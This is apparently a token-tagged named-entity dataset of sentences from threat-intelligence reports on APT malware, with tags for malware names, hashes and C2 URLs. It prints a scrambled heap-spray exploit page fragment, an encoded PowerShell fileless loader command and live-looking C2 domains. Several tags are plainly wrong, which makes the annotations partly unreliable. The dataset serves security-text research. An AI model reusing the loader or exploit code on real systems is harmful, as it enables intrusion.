COMMENT	O
'	O
)	O
;	O
x1	O
[	O
i	O
]	O
.data	O
=	O
'	O
abc	O
'	O
;	O
var	O
e1	O
=	O
null	O
;	O
function	O
ev1	O
(	O
evt	O
)	O
e1	O
=	O
document.createEventObject	O
(	O
evt	O
)	O
;	O
document.getElementById	O
(	O
'	O
sp1	O
'	O
)	O
.innerHTML	O
=	O
'	O
'	O
;	O
window.setInterval	O
(	O
ev2	O
,	O
50	O
)	O
;	O
'	O
\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u	O
0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0	O
d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d	O
'	O
;	O
x1	O
[	O
i	O
]	O
.data	O
=	O
p	O
;	O
for	O
(	O
i	O
=	O
0	O
;	O
i	O
<	O
x1.length	O
;	O
i	O
++	O
)	O
{	O
var	O
t	O
=	O
e1.srcElement	O
;	O
function	O
ev2	O
(	O
)	O
<	O
/script	O
>	O
<	O
/head	O
>	O
<	O
body	O
>	O
<	O
span	O
id='sp1	O
'	O
>	O
<	O
IMG	O
SRC='aaa.gif	O
'	O
onload='ev1	O
(	O
event	O
)	O
'	O
width='16	O
'	O
height='16	O
'	O
>	O
<	O
/span	O
>	O
<	O
/body	O
>	O
<	O
/html	O
>	O

Additional	O
Key	O
Additional	O
Key	O
HKLM\Software\Sun\1.1.2\IsoTp	O
HKLM\Software\Sun\1.1.2\AppleTlk	O
Other	O
potential	O
dropped	O
fi	O
les	O
,	O
as	O
reported	O
by	O
McAfee	O
:	O

The	O
key	O
factor	O
we	O
should	O
focus	O
on	O
,	O
as	O
an	O
industry	O
,	O
is	O
determining	O
HOW	O
an	O
attacker	O
can	O
take	O
down	O
an	O
organization	O
,	O
rather	O
than	O
focusing	O
only	O
on	O
the	O
WHO	O
.	O

The	O
RAT	B-malware.unknown
is	O
highly	O
modular—it	O
even	O
has	O
an	O
open	O
API	O
so	O
that	O
the	O
attacker	O
may	O
write	O
custom	O
modules	O
to	O
fit	O
their	O
needs	O
.	O

We	O
only	O
saw	O
about	O
30	O
logins	O
in	O
the	O
SSH	O
log	O
we	O
received	O
.	O

Using	O
Kaitai	O
struct	O
and	O
its	O
structure	O
dumper	O
,	O
the	O
following	O
representation	O
can	O
be	O
displayed	O
:	O

From	O
their	O
high	O
volume	O
0day	B-malware.unknown
deployment	I-malware.unknown
to	O
their	O
innovative	O
and	O
broad	O
malware	O
set	B-malware.backdoor
,	O
Sofacy	O
is	O
one	O
of	O
the	O
top	O
groups	O
that	O
we	O
monitor	O
,	O
report	O
,	O
and	O
protect	O
against	O
.	O

Leverage	O
hardware	O
features	O
that	O
provide	O
for	O
physical	O
control	O
of	O
the	O
ability	O
to	O
program	O
safety	O
controllers	O
.	O

Immediately	O
after	O
publication	O
,	O
the	O
servers	O
were	O
apparently	O
updated	O
to	O
evade	O
detection	O
by	O
the	O
Rapid7	O
fingerprint	O
.	O

The	O
Password	O
Stealer	O

The	O
data	O
in	O
between	O
is	O
also	O
base64	O
encoded	O
.	O

2016	O
.	O

Based	O
on	O
our	O
analysis	O
,	O
this	O
implant	O
establishes	O
an	O
encrypted	O
channel	O
to	O
the	O
attacker	O
's	O
server	O
,	O
likely	O
giving	O
the	O
attacker	O
the	O
ability	O
to	O
execute	O
commands	O
on	O
the	O
victim	O
's	O
machine	O
and	O
to	O
install	O
additional	O
malware	O
.	O

Appendix	O
D	O
:	O
Other	O
Collateral	O

Sofacy	O
,	O
also	O
known	O
as	O
APT28	O
,	O
Fancy	O
Bear	O
,	O
and	O
Tsar	O
Team	O
,	O
is	O
a	O
prolific	O
,	O
well	O
resourced	O
,	O
and	O
persistent	O
adversary	O
.	O

문자열이	O
존재	O
하지	O
않은	O
경우도	O
있다	O
.	O

It	O
makes	O
256	O
iterations	O
through	O
a	O
loop	O
;	O
on	O
each	O
iteration	O
,	O
it	O
swaps	O
the	O
positions	O
of	O
two	O
of	O
the	O
elements	O
in	O
the	O
substitution	O
table	O
.	O

The	O
bot	O
maintains	O
hardcoded	O
credentials	O
for	O
its	O
e-mail	O
account	O
.	O

Given	O
its	O
growing	O
prevalence	O
,	O
especially	O
among	O
Chinese	O
cybercriminals	O
,	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
warrants	O
much	O
more	O
exposure	O
than	O
it	O
has	O
received	O
to	O
date	O
.	O

By	O
processing	O
the	O
window	O
message	O
queue	O
it	O
filters	O
out	O
input	O
events	O
and	O
dispatches	O
them	O
to	O
a	O
raw	O
input	O
device	O
object	O
.	O

We	O
suspect	O
that	O
after	O
our	O
earlier	O
scans	O
were	O
published	O
the	O
operators	O
moved	O
them	O
.	O

This	O
is	O
a	O
first	O
stage	O
payload	O
that	O
drops	O
and	O
runs	O
the	O
NewCT	B-malware.backdoor
implant	O
.	O

The	O
new	O
tools	O
include	O
:	O

Size	O
Complie	O
Time	O
Import	O
Hash	O
16e627dbe730488b1c3d448bfc9096e2	B-hash
75776	O
bytes	O
2014-08-25	O
01:22:20	O
dcfaa2650d29ec1bd88e262d11d3236f	B-hash

תואמסיס	O
אמסיס	O

Then	O
the	O
macro	O
will	O
open	O
a	O
CMD	O
shell	O
that	O
will	O
execute	O
whatever	O
instruction	O
/	O
command	O
is	O
in	O
between	O
the	O
strings	O
.	O

For	O
any	O
questions	O
related	O
to	O
this	O
report	O
,	O
please	O
contact	O
NCCIC	O
or	O
the	O
FBI	O
.	O

E	O
:	O
\inetpub\wwwroot\	O
<	O
Redacted	O
>	O
\	O
Path	O
:	O
MD5	O
Hash	O
:	O
ffa82c64720179878b25793f17b304d7	B-hash
File	O
Size	O
:	O

Each	O
time	O
the	O
keylogger	O
starts	O
,	O
it	O
appends	O
the	O
following	O
header	O
to	O
the	O
log	O
file	O
:	O

Encrypted	O
POST	O
stub	O

Figure	O
13	O
.	O

The	O
Wemosis	B-malware.backdoor
backdoor	O
is	O
written	O
in	O
Delphi	O
and	O
allows	O
the	O
attacker	O
to	O
control	O
an	O
infected	O
computer	O
remotely	O
.	O

GetIpListAndConnect	O

PAYLOAD	O

Posible	O
Directory	O
Path	O
<	O
UserHomedir	O
>	O
/Library/Assistants/.local/.localized/<exe_name><UserHomedir>/Library/Assistants/.local/.com.apple.kshd/<exe_name><UserHomedir>/Library/Assistants/.local/.com.apple.erx/<exe_name><UserHomedir>/Library/Assistants/.local/.com.apple.fsg/<exe_name><UserHomedir>/Library/Assistants/.local/.com.apple.ulk/<exe_name><UserHomedir>/Library/Assistants/.local/.com.apple.wsat/<exe_name><UserHomedir>/Library/Assistants/.local/.com.apple.sksh/<exe_name><UserHomedir>/Library/Assistants/.local/.com.apple.ulkg/<exe_name><UserHomedir>/Library/Assistants/.local/.com.apple.updater/	O
<	O
exe_name	O
>	O
Possible	O
executable	O
name	O
<	O
exe_name	O
>	O
kshd	O
paxs	O
exprd	O
sync	O
scpo	O
update	O
skgc	O
wsat	O
launchd	O
lanchd	O
lauhd	O
mknod	O
mnod	O
rtsol	O
utyy	O
rtdl	O
Fres	O
mwwod	O
mpitil	O
mpiwtil	O
mpil	O
nfod	O
nfsrfd	O
ntfs	O
routr	O
route	O

A	O
global	O
and	O
unregulated	O
market	O
for	O
offensive	O
digital	O
tools	O
potentially	O
presents	O
a	O
novel	O
risk	O
to	O
both	O
national	O
and	O
corporate	O
cyber-security	O
.	O

Web	O
.	O

7f812da330a617400cb2ff41028c859181fe663f	B-hash

In	O
early	O
September	O
,	O
the	O
APT	O
group	O
behind	O
java-se.com	B-url.normal
raised	O
its	O
visibility	O
on	O
Volexityâ	B-malware.backdoor
€	I-malware.backdoor
TMs	I-malware.backdoor
radar	O
following	O
a	O
compromise	O
that	O
effectively	O
impacted	O
many	O
components	O
of	O
the	O
Japanese	O
Nikkei	O
.	O

netsat.exe	B-malware.infosteal
received	O
commands	O
from	O
an	O
encrypted	O
file	O
stored	O
on	O
the	O
local	O
system	O
.	O

0x406EAE	O
:	O
8B4DE8	O
MOV	O
ECX	O
,	O
DWORD	O
PTR	O
[	O
EBP-0x18	O
]	O

Startup	O
Item/Shortcut	O
:	O
BnorTEPkh.lnk	O

The	O
last	O
technique	O
was	O
previously	O
described	O
in	O
a	O
previous	O
ESET	O
research	O
article	O
about	O
Korplug	O
.	O

Additionally	O
,	O
even	O
if	O
the	O
file	O
is	O
detected	O
,	O
the	O
forensic	O
timeline	O
is	O
skewed	O
because	O
the	O
date	O
that	O
the	O
attacker	O
planted	O
the	O
file	O
is	O
no	O
longer	O
present	O
.	O

It	O
's	O
inclusion	O
alongside	O
a	O
similar	O
extension	O
list	O
makes	O
it	O
of	O
particular	O
interest	O
to	O
us	O
–but	O
remains	O
a	O
indicator	O
.	O

Clearly	O
,	O
this	O
is	O
very	O
unlikely	O
to	O
bring	O
any	O
web	O
server	O
to	O
its	O
knees	O
!	O

For	O
a	O
full	O
list	O
of	O
obfuscated	O
APIs	O
you	O
can	O
visit	O
obfuscated_calls.h	O
.	O

While	O
we	O
are	O
comfortable	O
assigning	O
nation-state	O
level	O
capabilities	O
to	O
this	O
operation	O
,	O
we	O
have	O
no	O
forensic	O
evidence	O
that	O
links	O
BugDrop	O
to	O
a	O
specific	O
nation-state	O
or	O
group	O
.	O

The	O
malware	O
has	O
not	O
avoided	O
detection	O
but	O
instead	O
been	O
so	O
inconspicuous	O
as	O
to	O
not	O
arouse	O
much	O
suspicion	O
due	O
to	O
the	O
fact	O
that	O
this	O
malware	O
only	O
represents	O
the	O
initial	O
phase	O
of	O
the	O
attack	O
.	O

We	O
assess	O
that	O
as	O
South	O
Korea	O
responds	O
to	O
these	O
attempted	O
thefts	O
by	O
increasing	O
security	O
(	O
and	O
possibly	O
banning	O
cryptocurrency	O
trading	O
)	O
they	O
will	O
become	O
harder	O
targets	O
,	O
forcing	O
North	O
Korean	O
actors	O
to	O
look	O
to	O
exchanges	O
and	O
users	O
in	O
other	O
countries	O
as	O
well	O
.	O

The	O
files	O
had	O
Adobe	O
Acrobat	O
reader	O
icon	O
or	O
MS	O
Word	O
icons	O
.	O

•	O
Obtaining	O
credentials	O
through	O
fabricated	O
Google	O
App	O
authorization	O
and	O
Oauth	O
access	O
requests	O
that	O
allow	O
the	O
group	O
to	O
bypass	O
two-factor	O
authentication	O
and	O
other	O
security	O
measures	O
.	O

718f9ca7a38a15b0d34a29a0b8b50c88bea9d67501ca6e2ae96fbc79edecdb9d	B-hash
2b98d9c0d30d09e791ad4dc981a17fa3e48fda7f1dfd68fd037946531e2cf718	B-hash
d26fb51be2d3db37fa37ba542365f616a1cecc3e4e0287e7a29a3a5a2dce7083	B-hash
d2591f4fe1c65e687c69cac007af27d24f656af5bc8eb8ff20064264fb71d56b	B-hash
da4f90ad50df05899bbcb7e9359da4541f989c57602ad2705eef1d561c99cfc3	B-hash
dca2e23324f7a740d431eef0083c0b795c63fb2f4ae4bc55bc236b12ea0510e2	B-hash
d26fb51be2d3db37fa37ba542365f616a1cecc3e4e0287e7a29a3a5a2dce7083	B-hash
2234a0ecb268aa8a855b23ad0c12cf39d1a18768c857ff6b8cd7af5e2f694525	B-hash
fb602ff538f71c04b2c8271514b3923d72543ed92e717c046884f3eb1317e2af	B-hash
97b69d8e0cf55708309c37d332137d10242a201c0dd93d6a513e5038dc139f57	B-hash
19841507ccf88d717a09bbba06a36644f1a555d1a53a11a2dea384bfccb9749f	B-hash
0ccc0fec930917707cf8573f4c5d0845197b95e300f8692757060910e50a1de6	B-hash
698db26e6f87e19dae93034fb9e1543e8675135e6da85120de20ab6ebbe9f30b	B-hash
a1ea427062bc9c497ed0660845c7e395500bf3d7f2f64c2a3f1137437d8ab6c9	B-hash
d7c0d5f399cf3f6738373aa72a5624352ce9eec1d2420c2aa91f73c565b721fd	B-hash
5a28683ee05c11670e17639f4eb99609ac3d665c45d50746e5898d9efdfd4a83	B-hash
ba2ffb1ff4003db3fdf3cf48b38b3ba6c447844b4399781cbb930fc9e11c23a4	B-hash
7b33a8c1184683f94598b4bb558f5050d5512b2cb66efa27d58322b97cf5569c	B-hash
81141007975251abadaa4c055f79999c0e61fb95724bfa4f98a91ced00534ebb	B-hash
down.pzchao.com	B-url.unknown
up.pzchao.com	B-url.cncsvr
dll.pzchao.com	B-url.unknown
pzchao.com.445	B-url.unknown
rat.pzchao.com	B-url.cncsvr
centuriosa.info	B-url.unknown
zll855.no-ip.info	B-url.unknown
zll855.gicp.net	B-url.unknown

Credentials	O

'	O
,	O
and	O
'	O
contact@namylufy[.]com	O
'	O
in	O
some	O
of	O
the	O
websites	O
.	O

The	O
CozyDuke	B-malware.drop
toolset	O
,	O
which	O
we	O
believe	O
has	O
been	O
under	O
active	O
development	O
since	O
at	O
least	O
2011	O
,	O
consists	O
of	O
tools	O
for	O
infecting	O
targeted	O
hosts	O
,	O
establishing	O
and	O
maintaining	O
backdoor	O
access	O
to	O
the	O
hosts	O
,	O
gathering	O
information	O
from	O
them	O
and	O
gaining	O
further	O
access	O
to	O
other	O
hosts	O
inside	O
the	O
victim	O
organization	O
.	O

תיאשמו	O
סובוטוא	O
תושגנתהב	O
םיעוצפ	O
כו-15	O
םיגורה	O
השיש	O

Password	O
getFirefoxPassword	O
]	O

Mutex	O
usage	O
and	O
checks	O
to	O
ensure	O
one	O
running	O
copy	O

In	O
the	O
case	O
no	O
analysis	O
machine	O
is	O
found	O
,	O
Reflective	O
Loader	O
will	O
be	O
called	O
again	O
with	O
the	O
'	O
_dec	O
'	O
(	O
possibly	O
abbreviation	O
of	O
the	O
word	O
'	O
decrypt	O
'	O
)	O
and	O
the	O
third	O
stage	O
of	O
the	O
attack	O
will	O
commence	O
.	O

MAC	O
address	O

Antiy	O
's	O
engines	O
provide	O
the	O
ability	O
to	O
detect	O
various	O
viruses	O
and	O
malware	O
for	O
network	O
security	O
products	O
and	O
mobile	O
devices	O
,	O
which	O
are	O
used	O
by	O
more	O
than	O
ten	O
well	O
known	O
security	O
vendors	O
.	O

Operational	O
working	O
hours	O
-	O
Most	O
of	O
the	O
malicious	O
activity	O
was	O
mostly	O
done	O
around	O
normal	O
business	O
hours	O
(	O
8AM-8PM	O
)	O
.	O

Both	O
of	O
these	O
appear	O
to	O
be	O
compromised	O
domains	O
given	O
they	O
are	O
also	O
hosting	O
legitimate	O
content	O
and	O
have	O
done	O
for	O
some	O
time	O
.	O

SECTION	O
REMOVED	O
FOR	O
SPACE	O
...	O

Code	O
snippet	O
of	O
the	O
obfuscated	O
document	O

They	O
both	O
show	O
traits	O
of	O
the	O
malware	O
described	O
by	O
CSEC	O
,	O
being	O
attributed	O
to	O
French	O
intelligence	O
with	O
'	O
moderate	O
certainty'.The	O
CSEC	O
document	O
mentions	O
uncovering	O
the	O
attack	O
in	O
2009	O
.	O

It	O
can	O
be	O
opened	O
as	O
a	O
standard	O
ZIP	O
archive	O
and	O
contains	O
the	O
following	O
files	O
:	O

These	O
and	O
other	O
details	O
make	O
us	O
believe	O
that	O
CloudAtlas	B-malware.unknown
represents	O
a	O
rebirth	O
of	O
the	O
RedOctober	B-malware.unknown
attacks	O
.	O

We	O
have	O
no	O
evidence	O
that	O
any	O
damage	O
or	O
harm	O
has	O
occurred	O
from	O
this	O
operation	O
,	O
however	O
identifying	O
,	O
locating	O
and	O
performing	O
reconnaissance	O
on	O
targets	O
is	O
usually	O
the	O
first	O
phase	O
of	O
operations	O
with	O
broader	O
objectives	O
.	O

systeminfo	O
command	O
saved	O
in	O
the	O
file	O
oledvbs.inc	O
by	O
following	O
the	O
hardcoded	O
path	O
:	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBoledvbs.inc	O
.	O

executeFile	O
:	O
]	O

seen	O
2013	O
03	O
03	O
01:57:37	O
0000	O
seen	O
2013	O
03	O
06	O
23:34:47	O
0000	O
1first2last3	O
news.grouptumbler.com	O
.	O

Our	O
research	O
,	O
Deciphering	O
Confucius	O
:	O
A	O
Look	O
at	O
the	O
Group	O
's	O
Cyberespionage	B-malware.backdoor
Operations	O
,	O
delves	O
into	O
the	O
group	O
's	O
operations	O
,	O
the	O
social	O
engineering	O
methods	O
and	O
gamut	B-malware.backdoor
of	O
malware	O
it	O
uses	O
,	O
and	O
the	O
countermeasures	O
that	O
organizations	O
can	O
adopt	O
to	O
mitigate	O
them	O
.	O

After	O
establishing	O
the	O
tools	O
,	O
an	O
infinite	O
loop	O
(	O
)	O
is	O
entered	O
in	O
which	O
the	O
server	O
variant	O
will	O
wait	O
for	O
up	O
to	O
1/100	O
of	O
a	O
second	O
for	O
input	O
from	O
the	O
network	O
;	O
if	O
such	O
input	O
arrives	O
,	O
the	O
server	O
routes	O
the	O
packet	O
to	O
the	O
appropriate	O
handler	O
.	O

File	O
nam	O
e	O
File	O
nam	O
e	O
Br	O
ie	O
f	O
Br	O
ie	O
f	O
de	O
scr	O
ipt	O
io	O
n	O
de	O
scr	O
ipt	O
io	O
n	O
T	O
im	O
eoft	O
he	O
T	O
im	O
eoft	O
he	O
m	O
d5sum	O
m	O
d5sum	O
lat	O
e	O
st	O
f	O
ile	O
lat	O
e	O
st	O
f	O
ile	O
S	O
iz	O
e	O
,	O
byt	O
esS	O
iz	O
e	O
,	O
byt	O
e	O
s	O
change	O
(	O
MS	O
K	O
)	O
change	O
(	O
MS	O
K	O
)	O

This	O
program	O
is	O
similar	O
to	O
the	O
pivot	O
module	O
but	O
with	O
reduced	O
functionality	O
:	O
it	O
maintains	O
the	O
hardcoded	O
Bulgarian	O
e-mail	O
account	O
,	O
logs	O
in	O
,	O
reads	O
incoming	O
e-mails	O
and	O
searches	O
for	O
the	O
special	O
subject	O
tag	O
'	O
Team	O
'	O
.	O

Contact	O
:	O
360zhuiri@360.cn	O
Lock	O
.	O

Sofacy	O
selectively	O
used	O
SPLM/CHOPSTICK	B-malware.backdoor
modules	O
as	O
second	O
stage	O
implants	O
to	O
high	O
interest	O
targets	O
for	O
years	O
now	O
.	O

Win32/TrojanDropper	O
.	O

We	O
came	O
to	O
this	O
conclusion	O
in	O
part	O
based	O
on	O
forensic	O
details	O
left	O
in	O
the	O
malware	O
that	O
APT28	B-malware.infosteal
had	O
employed	O
since	O
at	O
least	O
2007	O
.	O

'	O
Putin	O
's	O
Hydra	O
:	O
Inside	O
Russia	O
's	O
Intelligence	O
Services	O
'	O
,	O
a	O
recent	O
paper	O
from	O
European	O
Council	O
on	O
Foreign	O
Relations	O
,	O
does	O
an	O
excellent	O
job	O
outlining	O
the	O
highly	O
adversarial	O
relationship	O
between	O
Russia	O
's	O
main	O
intelligence	O
services	O
–	O
Федеральная	O
Служба	O
Безопасности	O
(	O
FSB	O
)	O
,	O
the	O
primary	O
domestic	O
intelligence	O
agency	O
but	O
one	O
with	O
also	O
significant	O
external	O
collection	O
and	O
'	O
active	O
measures	O
'	O
remit	O
,	O
Служба	O
Внешней	O
Разведки	O
(	O
SVR	O
)	O
,	O
the	O
primary	O
foreign	O
intelligence	O
agency	O
,	O
and	O
the	O
aforementioned	O
GRU	O
.	O

This	O
type	O
of	O
obfuscation	O
is	O
common	O
in	O
the	O
Lazarus	O
Hangman	B-malware.backdoor
malware	O
family	O
.	O

This	O
possibility	O
suggests	O
:	O
Intruder	O
remote	O
access	O
to	O
the	O
'	O
master	O
'	O
system	O
Intruder	O
local	O
access	O
to	O
the	O
'	O
master	O
'	O
system	O
An	O
exfiltration	O
mechanism	O
in	O
the	O
form	O
of	O
another	O
piece	O
of	O
code	O
Scanning	O
with	O
several	O
select	O
third	O
party	O
malware	O
detection	O
applications	O
resulted	O
in	O
zero	O
detections	O
.	O

Bennett	O
,	O
Targeted	O
Attack	O
and	O
Threat	O
Research	O
.	O

While	O
we	O
have	O
done	O
our	O
best	O
to	O
ensure	O
that	O
the	O
material	O
found	O
in	O
this	O
document	O
is	O
accurate	O
,	O
Fidelis	O
Security	O
Systems	O
,	O
Inc	O
.	O

Further	O
,	O
previous	O
implants	O
from	O
2017	O
contained	O
bogus	O
documents	O
with	O
financially	O
themed	O
content	O
.	O

The	O
variant	O
used	O
during	O
these	O
attacks	O
(	O
TROJ_RATANKBA.A	O
)	O
delivered	O
multiple	O
payloads	O
that	O
include	O
hacking	O
tools	O
and	O
software	O
targeting	O
banking	O
systems	O
.	O

According	O
to	O
an	O
article	O
,	O
version	O
1.5	O
was	O
used	O
against	O
the	O
US	O
Pentagon	O
.	O

When	O
communicating	O
with	O
its	O
C	O
&	O
C	O
,	O
Hussarini	B-malware.backdoor
uses	O
its	O
own	O
custom	O
protocol	O
encoded	O
with	O
base64	O
,	O
which	O
is	O
sent	O
over	O
HTTP	O
.	O

Pour	O
en	O
savoir	O
plus	O
:	O
www.kaspersky.fr	B-url.normal

8	O
.	O

7	O
An	O
example	O
file	O
header	O
in	O
a	O
compressed	O
Zip	O
or	O
JAR	O
file	O
.	O

FireEye	O
Labs	O
recently	O
identified	O
several	O
widespread	O
malspam	O
(	O
malware	O
spam	O
)	O
campaigns	O
targeting	O
Brazilian	O
companies	O
with	O
the	O
goal	O
of	O
delivering	O
banking	O
Trojans	O
.	O

It	O
posesses	O
a	O
file	O
header	O
which	O
among	O
other	O
attributes	O
keeps	O
system	O
specific	O
data	O
.	O

Most	O
of	O
the	O
domains	O
at	O
the	O
time	O
of	O
writing	O
,	O
and	O
indeed	O
historically	O
,	O
have	O
pointed	O
to	O
IP	O
address	O
space	O
owned	O
by	O
Host	O
Sailor	O
,	O
geo­located	O
in	O
Belize	O
.	O

All	O
these	O
capabilities	O
leave	O
no	O
doubt	O
about	O
the	O
tool	O
's	O
initial	O
purpose	O
and	O
reach	O
into	O
the	O
compromised	O
device	O
.	O

But	O
unlike	O
in	O
2017	O
,	O
this	O
time	O
the	O
malicious	O
attachment	O
is	O
an	O
executable	O
which	O
is	O
actually	O
a	O
self-extracting	O
archive	O
,	O
containing	O
a	O
decoy	O
document	O
and	O
the	O
malware	O
itself	O
.	O

Code	O
and	O
strings	O
example	O
(	O
decrypted	O
from	O
2018	O
'	O
ProcessRetranslator.dll	O
'	O
plugin	O
)	O
:	O
success	O
command	O
not	O
correct	O
error	O
save	O
parameters	O
error	O
set	O
parameters	O
for	O
channel	O
,	O
see	O
full	O
info	O
command	O
processing	O
error	O
not	O
correct	O
command	O
command	O
loading	O
func/net	O
module	O
error	O
command	O
unloading	O
func/net	O
module	O
error	O
cmd.exe	O
Retranslator	O
is	O
now	O
launched	O
Retranslator	O
is	O
now	O
stopped	O
the	O
process	O
is	O
destroyed	O
one	O
thread	O
has	O
died	O
so	O
the	O
process	O
is	O
killed	O
too	O
create	O
process	O
failed	O
on	O
:	O
(	O
%	O
s	O
)	O
,	O
error	O
(	O
%	O
d	O
)	O
Retranslator	O
is	O
already	O
running	O
Retranslator	O
is	O
not	O
running	O
exit	O
command	O
is	O
successful	O
command	O
is	O
unsuccessful	O

The	O
same	O
trick	O
was	O
used	O
in	O
the	O
Reflective	O
Loader	O
component	O
.	O

Evasion	O
techniques	O
are	O
crucial	O
for	O
successful	O
attacks	O
against	O
high	O
level	O
targets	O
,	O
such	O
as	O
in	O
the	O
case	O
of	O
the	O
Iranian	O
nuclear	O
program	O
.	O

Recall	O
,	O
that	O
this	O
number	O
reflects	O
only	O
one	O
of	O
many	O
command	O
and	O
control	O
servers	O
.	O

The	O
content	O
of	O
script	O
1	O
is	O
as	O
follows	O
:	O
The	O
functionality	O
of	O
this	O
part	O
is	O
:	O
decrypting	O
data	O
with	O
base64	O
encryption	O
and	O
getting	O
module	O
1	O
,	O
then	O
writing	O
to	O

?	O
\Parameters\	O

DROPPER	O

Although	O
the	O
archive	O
was	O
found	O
on	O
mid-April	O
,	O
the	O
Word	O
document	O
shows	O
that	O
it	O
was	O
last	O
edited	O
on	O
March	O
29	O
,	O
2018	O
.	O

29	O
Dec	O
.	O

It	O
consists	O
of	O
a	O
single	O
obfuscated	O
command	O
setup	O
to	O
run	O
persistently	O
,	O
such	O
as	O
:	O
powershell.exe	O
-NonInteractive	O
-ExecutionPolicy	O
Bypass	O
-EncodedCommand	O
ZgB1AG4AYwB0AGkAbwBuACAAcABlAHIAZgBDAHIAKAAkAGMAcgBUAHIALAAgACQAZABhAHQAYQApAA0ACgB7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAG0AcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQANAAoACQAJACQAYwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AQwByAHkAcAB0AG8AUwB0AHIAZQBhAG0AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoACQAbQBzACwAIAAkAGMAcgBUAHIALAAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEMAcgB5AHAAdABvAFMAdAByAGUAYQBtAE0AbwBkAGUAXQA6ADoAVwByAGkAdABlACkADQAKAAkACQAkAGMAcwAuAFcAcgBpAHQAZQAoACQAZABhAHQAYQAsACAAMAAsACAAJABkAGEAdABhAC4ATABlAG4AZwB0AGgAKQANAAoACQAJACQAYwBzAC4ARgBsAHUAcwBoAEYAaQBuAGEAbABCAGwAbwBjAGsAKAApAA0ACgAJAAkAJAByAGUAdAAgAD0AIAAkAG0AcwAuAFQAbwBBAHIAcgBhAHkAKAApAA0ACgAJAAkAJABjAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJAAkAJABtAHMALgBDAGwAbwBzAGUAKAApAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsAfQANAAoACQByAGUAdAB1AHIAbgAgACQAcgBlAHQADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABkAGUAYwByAEEAZQBzACgAJABlAG4AYwBEAGEAdABhACwAIAAkAGsAZQB5ACwAIAAkAGkAdgApAA0ACgB7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAHAAcgBvAHYAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBSAGkAagBuAGQAYQBlAGwATQBhAG4AYQBnAGUAZAANAAoACQAJACQAcAByAG8AdgAuAEsAZQB5ACAAPQAgACQAawBlAHkADQAKAAkACQAkAHAAcgBvAHYALgBJAFYAIAA9ACAAJABpAHYADQAKAAkACQAkAGQAZQBjAHIAIAA9ACAAJABwAHIAbwB2AC4AQwByAGUAYQB0AGUARABlAGMAcgB5AHAAdABvAHIAKAAkAHAAcgBvAHYALgBLAGUAeQAsACAAJABwAHIAbwB2AC4ASQBWACkADQAKAAkACQAkAHIAZQB0ACAAPQAgAHAAZQByAGYAQwByACAAJABkAGUAYwByACAAJABlAG4AYwBEAGEAdABhAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsAfQANAAoACQByAGUAdAB1AHIAbgAgACQAcgBlAHQADQAKAH0ADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABzAFcAUAAoACQAYwBOACwAIAAkAHAATgAsACAAJABhAEsALAAgACQAYQBJACkADQAKAHsADQAKAAkAaQBmACgAJABjAE4AIAAtAGUAcQAgACQAbgB1AGwAbAAgAC0AbwByACAAJABwAE4AIAAtAGUAcQAgACQAbgB1AGwAbAApAHsAcgBlAHQAdQByAG4AIAAkAGYAYQBsAHMAZQB9AA0ACgAJAHQAcgB5AHsADQAKAAkACQAkAHcAcAAgAD0AIAAoAFsAdwBtAGkAYwBsAGEAcwBzAF0AJABjAE4AKQAuAFAAcgBvAHAAZQByAHQAaQBlAHMAWwAkAHAATgBdAC4AVgBhAGwAdQBlAA0ACgAJAAkAJABlAHgARQBuACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJAB3AHAAKQANAAoACQAJACQAZQB4AEQAZQBjACAAPQAgAGQAZQBjAHIAQQBlAHMAIAAkAGUAeABFAG4AIAAkAGEASwAgACQAYQBJAA0ACgAJAAkAJABlAHgAIAA9ACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZQB4AEQAZQBjACkADQAKAAkACQBpAGYAKAAkAGUAeAAgAC0AZQBxACAAJABuAHUAbABsACAALQBvAHIAIAAkAGUAeAAgAC0AZQBxACAAJwAnACkADQAKAAkACQB7AHIAZQB0AHUAcgBuAH0ADQAKAAkACQBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGUAeAANAAoACQAJAHIAZQB0AHUAcgBuACAAJAB0AHIAdQBlAA0ACgAJAH0ADQAKAAkAYwBhAHQAYwBoAHsADQAKAAkACQByAGUAdAB1AHIAbgAgACQAZgBhAGwAcwBlAA0ACgAJAH0ADQAKAH0ADQAKAA0ACgAkAGEAZQBLACAAPQAgAFsAYgB5AHQAZQBb